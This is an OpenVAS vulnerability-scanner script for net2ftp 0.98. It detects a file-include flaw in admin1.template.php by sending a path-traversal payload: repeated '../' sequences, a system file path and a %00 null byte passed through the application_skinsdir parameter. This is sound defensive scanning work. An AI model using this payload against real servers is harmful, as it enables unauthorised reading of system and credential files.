###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_net2ftp_lfi.nasl 13235 2019-01-23 10:05:41Z ckuersteiner $
#
# net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:net2ftp:net2ftp";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100943");
  script_version("$Revision: 13235 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-23 11:05:41 +0100 (Wed, 23 Jan 2019) $");
  script_tag(name:"creation_date", value:"2010-12-10 13:28:59 +0100 (Fri, 10 Dec 2010)");
  script_bugtraq_id(45312);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("net2ftp 'admin1.template.php' Local and Remote File Include Vulnerabilities");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/45312");
  script_xref(name:"URL", value:"http://www.net2ftp.com/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("net2ftp_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("net2ftp/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"The 'net2ftp' program is prone to a local file-include vulnerability
and a remote file-include vulnerability because the application fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues to obtain sensitive information, other attacks are also possible.

net2ftp 0.98 stable is vulnerable, other versions may also be affected.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/skins/mobile/admin1.template.php?net2ftp_globals[application_skinsdir]=" +
        crap(data: "../", length: 3*9) + files[file] + "%00";

  if (http_vuln_check(port:port, url:url, pattern:file)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
